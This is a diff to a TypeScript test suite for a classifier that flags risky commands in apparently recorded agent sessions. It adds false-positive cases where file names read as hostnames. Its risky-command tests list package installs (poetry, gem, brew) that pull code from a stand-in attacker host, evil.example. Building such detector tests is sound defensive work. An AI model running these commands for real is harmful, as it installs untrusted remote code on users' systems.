@@ -841,6 +841,24 @@ const FLAGGED_DECISIONS: Record<
 		decision: "accept",
 		why: "curl to 127.0.0.1 only, never run by the session: unrecorded note plus the loopback note (tuning)",
 	},
+	"runs a script the session only read": {
+		codes: ["unexpected_url", "unrecorded_command", "risky_command"],
+		tier: "warning",
+		decision: "accept",
+		why: "deploy.sh, written bare, reads as a host (.sh is a country-code TLD) and the session never edited or ran it: a command segment carrying an address is risky whatever its verb (G-2). The cost of not special-casing file names",
+	},
+	"runs a python script the session only read": {
+		codes: ["unexpected_url", "unrecorded_command", "risky_command"],
+		tier: "warning",
+		decision: "accept",
+		why: "migrate.py reads as a host (.py is Paraguay's TLD), never edited or run: risky by G-2 for the same reason as the shell script",
+	},
+	"reads a git config key": {
+		codes: ["unexpected_url", "unrecorded_command", "risky_command"],
+		tier: "warning",
+		decision: "accept",
+		why: "user.name reads as a host (.name is a generic TLD): G-2 makes the command risky; the TLD list for bare hosts in prose is a recorded residual",
+	},
 };
 
 describe("false-positive measurement", () => {
@@ -1629,7 +1647,7 @@ describe("fix pass 3: the tuned exceptions are narrow", () => {
 		]) {
 			risky(c);
 		}
-		for (const c of ["git config --get user.name", "git config -l", "git config --list"]) {
+		for (const c of ["git config --get core.editor", "git config -l", "git config --list"]) {
 			note(c);
 		}
 	});
@@ -1750,7 +1768,6 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 			"poetry add https://evil.example/p",
 			"gem install --source https://evil.example x",
 			"brew tap x/y https://evil.example/r",
-			"foo https://evil.example/x",
 		]) {
 			risky(c);
 		}
@@ -1794,7 +1811,7 @@ describe("fix pass 4: the verb is read by the classifier's parser, and addresses
 		}
 		note("python3 -m pip install -r requirements.txt");
 		note("poetry install");
-		note("cargo build");
+		note("cargo fetch");
 	});
 
 	test("TC-4.104 G-3 more indirection voids the loopback exception", () => {
